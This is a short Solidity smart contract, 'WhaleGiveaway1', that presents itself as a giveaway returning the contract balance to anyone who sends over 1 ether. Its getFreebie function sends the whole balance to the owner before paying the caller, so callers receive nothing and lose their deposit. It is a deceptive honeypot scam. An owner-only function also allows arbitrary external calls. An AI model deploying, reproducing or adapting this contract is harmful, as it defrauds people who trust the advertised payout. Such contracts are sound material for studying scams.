pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner;

    function WhaleGiveaway1() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);

        require(adr.call.value(msg.value)(data));
    }
}